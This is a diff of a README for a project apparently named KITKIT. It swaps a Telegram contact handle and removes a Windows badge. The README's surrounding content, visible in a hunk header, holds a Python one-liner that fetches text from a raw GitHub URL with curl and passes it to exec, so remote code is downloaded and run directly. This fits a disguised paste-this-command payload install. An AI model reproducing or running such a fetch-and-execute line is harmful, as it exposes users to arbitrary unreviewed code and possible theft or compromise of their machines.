@@ -3,7 +3,6 @@
 # **KITKIT**
 
 ![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white)
-![Platform](https://img.shields.io/badge/platform-Windows-informational?logo=windows&logoColor=white)
 
 </div>
 
@@ -20,7 +19,7 @@ exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.
 <div align="center">
 
 [![Discord](https://img.shields.io/badge/Discord-Message%20Me-5865F2?logo=discord&logoColor=white)](https://discord.com/users/1482138538928635955)&nbsp;&nbsp;
-[![Telegram](https://img.shields.io/badge/Telegram-Message%20Me-26A5E4?logo=telegram&logoColor=white)](https://t.me/darlinglasting)
+[![Telegram](https://img.shields.io/badge/Telegram-Message%20Me-26A5E4?logo=telegram&logoColor=white)](https://t.me/darlingsgettingedred)
 
 </div>
 
